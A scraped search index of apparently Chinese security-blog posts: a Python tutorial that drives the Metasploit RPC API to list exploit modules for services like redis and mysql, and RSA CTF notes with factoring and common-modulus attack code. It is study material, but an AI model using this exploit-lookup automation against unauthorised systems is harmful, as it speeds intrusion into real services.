https://blog.csdn.net/qq_39506912/article/details/118834054 https://blog.csdn.net/mw_mustwin/article/details/53039338 https://blog.csdn.net/u010167269/article/details/52638771 https://github.com/rlabbe/Kalman-and-Bayesian-Filters-in-Python https://github.com/NikolasEnt/Extended-Kalman-Filter https://blog.csdn.net/Young_GY/article/details/78468153 ","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:4:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"0x04 数据融合 ","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:5:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"0x05 预测和路径规划 http://web.mit.edu/16.412j/www/html/papers/original_dstar_icra94.pdf https://blog.csdn.net/hgdwdtt/article/details/82052577?spm=1001.2014.3001.5501 https://blog.csdn.net/hgdwdtt/article/details/82080558 ","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:6:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"0x06 车辆模型 ","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:7:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"0x07 安全问题 ","date":"2021-07-31","objectID":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/:8:0","tags":["安全前沿"],"title":"Autodriving摸门槛笔记","uri":"/2021-08-01-autodriving%E6%91%B8%E9%97%A8%E6%A7%9B%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:0:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"0x00 需求 漏洞搜索模块： 功能：搜索msf内置的攻击模块，返回模块的路径 输入：service 返回： { “service”:“path” } 难点：搜索服务的路径，优先返回远程代码执行等高危害，容易展示的漏洞 ","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:1:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"0x01 Metasploit API Metasploit官方提供有RPC方式调用，即标准API调用。 RPC API 调用官方文档 开启服务端API服务有两种方式： 通过msfconsole加载msfrpc插件来开启RPC 打开msfconsole，输入load msgrpc ServerHost=IP地址 ServerPort=端口 User=用户名 Pass=密码 通过msfrpcd服务来开启RPC msfrpcd -U 用户名 -P 密码 -S -f msfrpcd的详细参数如下：\rUsage: msfrpcd \u003coptions\u003e\rOPTIONS:\r-P \u003copt\u003e 设置RPC登录密码\r-S 在RPC socket上禁止使用SSL\r-U \u003copt\u003e 设置RPC登录用户名\r-a \u003copt\u003e 绑定一个IP地址（本机IP地址）\r-f 在后台以精灵进程（守护进程）的方式运行、启动\r-h 帮助菜单\r-n 禁止使用数据库\r-p \u003copt\u003e 绑定某个端口，默认为55553\r-u \u003copt\u003e 设置Web服务器的URI\r与msf rpc api通信需要对通信的内容使用msgpack进行序列化，简单来说就是将要发送的数据包转换为二进制形式，以便于传输和格式统一。msgpack序列化之后的数据包支持多种语言，可以在msf服务端由ruby正常解析。 ","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:2:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"0x02 登录认证 ","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:3:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"auth.login The auth.login method allows a username and password to be supplied which in turn grants the caller with a temporary authentication token. This authentication token expires five minutes after the last request made with it. ","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:4:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"Syntax auth.login(String: Username, String: Password) ","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:4:1","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"Successful Request Example Client: [ \"auth.login\", \"MyUserName\", \"MyPassword\"] Server: { \"result\" =\u003e \"success\",\r\"token\" =\u003e \"a1a1a1a1a1a…\"\r}\rToken是令牌码，一个随机字符串，是登录认证后的标识。\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:4:2","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"Unsuccessful Request Example Client: [ \"auth.login\", \"MyUserName\", \"BadPassword\"]\rServer: {\r\"error\" =\u003e true,\r\"error_class\" =\u003e \"Msf::RPC::Exception\",\r\"error_message\" =\u003e \"Invalid User ID or Password\"\r}\rimport msgpack\rimport http.client\rHOST=\"127.0.0.1\"\rPORT=\"55553\"\rheaders = {\"Content-type\" : \"binary/message-pack\"}\r# 连接MSF RPC Socket\rreq = http.client.HTTPConnection(HOST, PORT)\roptions = [\"auth.login\",\"msf\",\"msf\"]\r# 对参数进行序列化（编码）\roptions = msgpack.packb(options)\r# 发送请求，序列化之后的数据包\rreq.request(\"POST\",\"/api/1.0\",body=options,headers=headers)\r# 获取返回\rres = req.getresponse().read()\r# 对返回进行反序列户（解码）\rres = msgpack.unpackb(res)\rres = res[b'token'].decode()\rprint(res)\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:4:3","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"0x03 操作控制台 ","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:5:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"Console The Console API provides the ability to allocate and work with the Metasploit Framework Console. In addition to being able to send commands and read output, these methods expose the tab completion backend as well being able to detach from and kill interactive sessions. Note that consoles provide the ability to do anything a local Metasploit Framework Console user may do, including running system commands. 下面简要介绍几种常用的函数 ","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:6:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"console.create The console.create method is used to allocate a new console instance. The server will return a Console ID (“id”) that is required to read, write, and otherwise interact with the new console. The “prompt” element in the return value indicates the current prompt for the console, which may include terminal sequences. Finally, the “busy” element of the return value determines whether the console is still processing the last command (in this case, it always be false). Note that while Console IDs are currently integers stored as strings, these may change to become alphanumeric strings in the future. Callers should treat Console IDs as unique strings, not integers, wherever possible. 简单理解就是创建一个控制台实例。 Client: [ \"console.create\", \"\u003ctoken\u003e\"]\rServer: {\r\"id\" =\u003e \"0\",\r\"prompt\" =\u003e \"msf \u003e \",\r\"busy\" =\u003e false\r}\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:6:1","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"console.destroy The console.destroy method deletes a running console instance by Console ID. Consoles should always be destroyed after the caller is finished to prevent resource leaks on the server side. If an invalid Console ID is specified, the “result” element will be set to the string “failure” as opposed to “success”. 销毁掉控制台实例。 Client: [ \"console.destroy\", \"\u003ctoken\u003e\", \"ConsoleID\"]\rServer: { \"result\" =\u003e \"success\" }\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:6:2","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"console.list The console.list method will return a hash of all existing Console IDs, their status, and their prompts. Client: [ \"console.list\", \"\u003ctoken\u003e\"]\rServer: {\r\"0\" =\u003e {\r\"id\" =\u003e \"0\",\r\"prompt\" =\u003e \"msf exploit(\\x01\\x02\\x01\\x02handler\\x01\\x02) \u003e \",\r\"busy\" =\u003e false\r},\r\"1\" =\u003e {\r\"id\" =\u003e \"1\",\r\"prompt\" =\u003e \"msf \u003e \",\r\"busy\" =\u003e true\r}\r}\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:6:3","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"console.write The console.write method will send data to a specific console, just as if it had been typed by a normal user. This means that most commands will need a newline included at the end for the console to process them properly. 在控制台写入命令。 Client: [ \"console.write\", \"\u003ctoken\u003e\", \"0\", \"version\\n\"]\rServer: { \"wrote\" =\u003e 8 }\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:6:4","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"console.read The console.read method will return any output currently buffered by the console that has not already been read. The data is returned in the raw form printed by the actual console. Note that a newly allocated console will have the initial banner available to read. 读取控制台的输出 Client: [ \"console.read\", \"\u003ctoken\u003e\", \"0\"]\rServer: {\r\"data\" =\u003e \"Framework: 4.0.0-release.14644[..]\\n\",\r\"prompt\" =\u003e \"msf \u003e \",\r\"busy\" =\u003e false\r}\r下面提供一个demo，调用MSF RPC登录获取Token之后创建实例，用户输入所需要查找的服务名称，拼接后发送命令到控制台，由msf服务端去执行。执行成功之后会将结果以序列化后的形式返回。反序列化之后成为一个dict，包含了返回后的结果。\rimport msgpack\rimport http.client\rimport re\rimport json\rHOST=\"127.0.0.1\"\rPORT=\"55553\"\rheaders = {\"Content-type\" : \"binary/message-pack\"}\r# 连接MSF RPC Socket\rreq = http.client.HTTPConnection(HOST, PORT)\roptions1= [\"auth.login\",\"msf\",\"msf\"]\r# 对参数进行序列化（编码）\roptions1= msgpack.packb(options1)\r# 发送请求，序列化之后的数据包\rreq.request(\"POST\",\"/api/1.0\",body=options1,headers=headers)\r# 获取返回\rres1= req.getresponse().read()\r# 对返回进行反序列户（解码）\rres1= msgpack.unpackb(res1)\rtoken= res1[b'token'].decode('utf8')\roptions2= [\"console.create\",token]\roptions2= msgpack.packb(options2)\rreq.request(\"POST\",\"/api/1.0\",body=options2,headers=headers)\r# 获取返回\rres2= req.getresponse().read()\r# 对返回进行反序列户（解码）\rres2= msgpack.unpackb(res2, strict_map_key=False)\rid= res2[b'id']\rprint(\"Please input thr service name:\")\rservice= input()\roptions3= [\"console.write\",token,id, \"search \"+service+\"\\n\"]\roptions3= msgpack.packb(options3)\rreq.request(\"POST\",\"/api/1.0\",body=options3,headers=headers)\r# 获取返回\rres4= req.getresponse().read()\r# 对返回进行反序列户（解码）\rres4= msgpack.unpackb(res4, strict_map_key=False)\roptions4= [\"console.read\",token,id]\roptions4= msgpack.packb(options4)\rreq.request(\"POST\",\"/api/1.0\",body=options4,headers=headers)\r# 获取返回\rres4= req.getresponse().read()\r# 对返回进行反序列户（解码）\rres4= msgpack.unpackb(res4, strict_map_key=False)\rdata=res4[b'data'].decode('utf8')\rprint(data)\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:6:5","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"0x04 优化 创建类，引入正则匹配和json格式化输出。优先返回远程代码执行等高危害，容易展示的漏洞。 import requests\rimport msgpack\rimport sys\rimport time\rimport re\rimport json\rclass Msfrpc:\rclass MsfError(Exception):\rdef __init__(self,msg):\rself.msg = msg\rdef __str__(self):\rreturn repr(self.msg)\rclass MsfAuthError(MsfError):\rdef __init__(self,msg):\rself.msg = msg\rdef __init__(self,opts=[]):\rself.host = \"127.0.0.1\"# MSF的IP地址\rself.port = \"55553\"# 端口号\rself.uri = \"/api/\"# api默认使用/api/或/api/1.0\rself.ssl = False\rself.token = None\rself.headers = {\"Content-type\" : \"binary/message-pack\"}\rdef encode(self, data):\rreturn msgpack.packb(data)\rdef decode(self, data):\rreturn msgpack.unpackb(data)\rdef call(self, method, opts=[]):\rif method != 'auth.login':\rif self.token == None:\rraise self.MsfAuthError(\"MsfRPC: Not Authenticated\")\rif method != \"auth.login\":\ropts.insert(0, self.token)\rif self.ssl == True:\rurl = \"https://%s:%s%s\" % (self.host, self.port, self.uri)\relse:\rurl = \"http://%s:%s%s\" % (self.host, self.port, self.uri)\ropts.insert(0, method)\rpayload = self.encode(opts)\rr = requests.post(url, data=payload, headers=self.headers)\ropts[:] = [] # 清空opts列表\rreturn self.decode(r.content)\rdef login(self, user, password):\rauth = self.call(\"auth.login\", [user, password])\rtry:\rif auth[b'result'] == b'success':\rself.token = auth[b'token'].decode('utf8')\rreturn True\rexcept:\rraise self.MsfAuthError(\"MsfRPC: Authentication failed\")\rif __name__ == '__main__':\rclient = Msfrpc({})# 创建一个新的默认配置的客户端实例\rclient.login('msf','msf')# 使用密码msf登录msf\rtry:\rres = client.call('console.create')\rconsole_id = res[b'id']\rexcept:\rprint (\"Console create failed\\r\\n\")\rsys.exit()\rservice=['redis','mysql']# 定义服务列表\rservice_path={}\rfor i in range(0,len(service)):\rcmd=\"search \"+service[i]+\"\\n\"# 构造命令\rclient.call('console.write',[console_id,cmd])\r# 使用msfrpc的api将命令写入控制台\rtime.sleep(1)\rwhile True:\rres = client.call('console.read',[console_id])\r# 使用msfrpc的api读取控制台的输出\rif len(res[b'data']) \u003e 1:\rdata=res[b'data'].decode('UTF-8')\rfilter_data=re.compile('exploit/\\S*').findall(data)\r# 通过正则表达式过滤出exploit的漏洞\rservice_path[service[i]]=[]\r# 构造字典，将服务与漏洞的路径组成键值对\rfor j in range(0,len(filter_data)):\r# 将list的data结果循环插入\rservice_path[service[i]].append(filter_data[j])\rif res[b'busy'] == True:\rtime.sleep(1)\rcontinue\rbreak\rjson_service_path=json.dumps(service_path ,indent=2)# 转换成json格式输出\rprint(json_service_path)\rclient.call('console.destroy',[console_id])# 关闭控制台\r","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:7:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习"],"content":"0x05 参考文献 https://github.com/dr0op/MsfRpcApi https://github.com/DanMcInerney/msfrpc/blob/master/msfrpc.py https://docs.rapid7.com/metasploit/standard-api-methods-reference/ ","date":"2021-07-25","objectID":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/:8:0","tags":["安全开发"],"title":"Python调用实现MSF漏洞搜索模块","uri":"/2021-07-25-python%E8%B0%83%E7%94%A8%E5%AE%9E%E7%8E%B0msf%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97/"},{"categories":["学习","安全技术"],"content":"参考安全牛、NepNep、https://www.tr0y.wang/2017/11/06/CTFRSA/等文章总结。 ","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 相关数学概念 欧拉函数是求小于x并且和x互质的数的个数。 φ(n) = (p-1)(q-1) 模反元素 所谓\"模反元素\"就是指有一个整数d，可以使得ed被φ(n)除的余数为1。 ed ≡ 1 (mod φ(n))这个式子等价于ed - 1 = kφ(n) 模逆元：\r可以使用Python第三方包Crypto的inverse() 函数求模逆元。\rfrom Crypto.Util.number import inverse\rprint(inverse(3, 7)) # 3 是要求逆元的数，7是模数\r可以使用Python第三方包gmpy2的invert() 函数求模逆元。\rfrom gmpy2 import invert\rprint(invert(3, 7)) # 3 是要求逆元的数，7是模数\r可以在SageMath中直接用inverse_mod() 函数求模逆元。\rinverse_mod(3, 7) # 3 是要求逆元的数，7是模数\r费马小定理： 假如a 为一个整数，p 为一个素数，则ap-1 ≡1(𝑚𝑜𝑑 𝑝) 欧拉定理： 假设a 和m 都是整数，且gcd(a, m) = 1 则有𝑎Φ(m)≡1(𝑚𝑜𝑑 𝑚) 孙子定理是中国古代求解一次同余式组的方法。有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？即，一个整数除以三余二，除以五余三，除以七余二，求这个整数。《孙子算经》中首次提到了同余方程组问题，以及以上具体问题的解法，因此在中文数学文献中也会将中国剩余定理称为孙子定理。 ","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x01 RSA加解密 RSA加密过程 第一步，随机选择两个不相等的质数p和q。 选择61和53。（实际应用中，这两个质数越大，就越难破解。） 第二步，计算p和q的乘积n。 n = 61×53 = 3233 第三步，计算n的欧拉函数φ(n)。 φ(n) = (p-1)(q-1) 算出φ(3233)等于60×52，即3120。 第四步，随机选择一个整数e，条件是1\u003c e \u003c φ(n)，且e与φ(n) 互质。 在1到3120之间，随机选择了17。（实际应用中，常常选择65537。） 第五步，计算e对于φ(n)的模反元素d。 已知e=17, φ(n)=3120，17x + 3120y = 1 算出一组整数解为(x,y)=(2753,-15)，即d=2753。 第六步，将n和e封装成公钥，n和d封装成私钥。 n=3233，e=17，d=2753，所以公钥就是(3233,17)，私钥就是（3233, 2753） ","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x02 python相关函数 生成随机素数 getPrime()函数，括号里的参数意义为位长度，下面示例表示生成一个512bits 的随机素数。 getStrongPrime() 函数，括号里的参数意义为位长度，生成一个更安全的素数。 计算模逆元的两个函数的区别 使用Crypto 包里的inverse() 函数，两个参数不互素的时候返回的是除以最大公因数之后的逆元。互素的情况下和gmpy2的invert返回值相同。 使用gmpy2 包里的invert() 函数，两个参数不满足互素时会报错，只有满足互素时正常求逆元。 判断素数 𝑖𝑠𝑃𝑟𝑖𝑚𝑒() 可以用来判断素数 gcd求最大公因数 开 n 次方根 使用gmpy2 的iroot 函数，可以开n 次方根，返回一个数字，一个布尔值。数字表示开根的结果，布尔值表示结果的n 次方是否刚好等于原来的数。 ","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x03 RSA简单例题 已知p、q、e、c，求d Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm. p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Use RSA to find the secret message 解密核心代码： import gmpy2 phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) n = p*q print pow(c,d,n) ","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x04 分解素因数攻击 n 的数值很大，RSA中常用的数量级往往不能通过枚举的方法（试除法）分解因数。但是如果生成的素数是不安全的，有可能导致n 很容易被分解。 已知密文c，公钥(n,e)，求d。pub.key如下： -----BEGIN PUBLIC KEY-----\rMDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+\r/AvKr1rzQczdAgMBAAE=\r-----END PUBLIC KEY-----\r使用openssl rsa -pubin -text -modulus -in pub.key。 把n转成整型，86934482296048119190666062003494800588905656017203025617216654058378322103517，解密核心代码如下： import gmpy2\rimport rsa\rphi = (p-1)*(q-1)\rd = gmpy2.invert(e,phi)\rkey = rsa.PrivateKey(n,e,int(d),p,q)\rwith open(\"flag.enc\", \"rb+\") as f:\rf = f.read()\rprint (rsa.decrypt(f,key))\r","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x05 共模攻击 当n不变的情况下，知道n,e1,e2,c1,c2 可以在不知道d1,d2的情况下，解出m。前提：e1和e2互质。 贝祖公式：e1*s1+e2*s2 = 1 （s1 s2 为一正一负的整数） c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361 n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801 e1=11187289 c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397 e2=9647291 解密核心代码： import gmpy2 import binascii s = gmpy2.gcdext(e1,e2) #扩展欧几里得算法 s1 = s[1] s2 = s[2] # 求模反元素 if s1 \u003c 0: s1 = -s1 c1 = gmpy2.invert(c1, n) elif s2 \u003c 0: s2 = -s2 c2 = gmpy2.invert(c2, n) m = pow(c1, s1, n) 